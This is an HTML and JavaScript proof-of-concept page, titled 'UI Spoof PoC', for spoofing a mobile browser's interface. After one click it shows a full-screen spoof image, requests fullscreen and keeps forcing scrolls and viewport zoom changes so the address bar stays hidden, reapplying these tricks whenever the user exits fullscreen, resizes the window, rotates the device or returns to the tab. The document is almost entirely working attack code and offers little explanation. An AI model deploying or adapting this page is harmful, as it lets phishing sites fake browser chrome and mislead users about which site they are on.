<!DOCTYPE html>
<html lang="en">
<head>
  <title>UI Spoof PoC</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes,viewport-fit=cover"/>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 300vh;
      background: #000;
      font-family: system-ui, sans-serif;
      overscroll-behavior: none;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: contain;
      background: #000;
      display: none;
      z-index: 9999;
    }

    #content {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      text-align: center;
      z-index: 10;
    }

    #bottomCover {
      position: fixed;
      left: 0;
      right: 0;
      bottom: 0;
      height: env(safe-area-inset-bottom, 24px);
      background: #000;
      z-index: 10000;
      pointer-events: none;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof3.png" alt="spoof-ui">
<div id="content"><h1>Click anywhere</h1></div>
<div id="bottomCover"></div>

<script>
let once = false;

// auto scroll ke bawah
function autoScrollDown() {
  const maxScroll = document.body.scrollHeight - window.innerHeight;
  for (let i=0; i<50; i++) {
    requestAnimationFrame(() => window.scrollTo(0, maxScroll));
  }
}

// hide omnibar paksa
function hideOmnibarHard() {
  for (let i=0; i<50; i++) {
    requestAnimationFrame(() => window.scrollTo(0,1));
  }
}

// zoom out / reset viewport trick
function zoomOutViewport() {
  const meta = document.querySelector('meta[name=viewport]');
  if (!meta) return;
  meta.setAttribute('content','width=device-width,initial-scale=0.8,maximum-scale=1,user-scalable=yes,viewport-fit=cover');
  setTimeout(()=> {
    meta.setAttribute('content','width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes,viewport-fit=cover');
  }, 300);
}

onclick = () => {
  if (once) return;
  once = true;

  hideOmnibarHard();
  autoScrollDown();

  content.style.display = "none";
  spoof.style.display = "block";

  document.documentElement.requestFullscreen?.().catch(()=>{});
};

// keluar fullscreen
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    // best effort untuk sembunyikan omnibar
    hideOmnibarHard();
    autoScrollDown();
    zoomOutViewport();
    setTimeout(hideOmnibarHard, 150);
    setTimeout(autoScrollDown, 200);
  }
});

// fallback
window.addEventListener("resize", () => { hideOmnibarHard(); autoScrollDown(); zoomOutViewport(); });
window.addEventListener("orientationchange", () => { hideOmnibarHard(); autoScrollDown(); zoomOutViewport(); });
document.addEventListener("visibilitychange", () => { if(!document.hidden){ hideOmnibarHard(); autoScrollDown(); zoomOutViewport(); } });

</script>

</body>
</html>
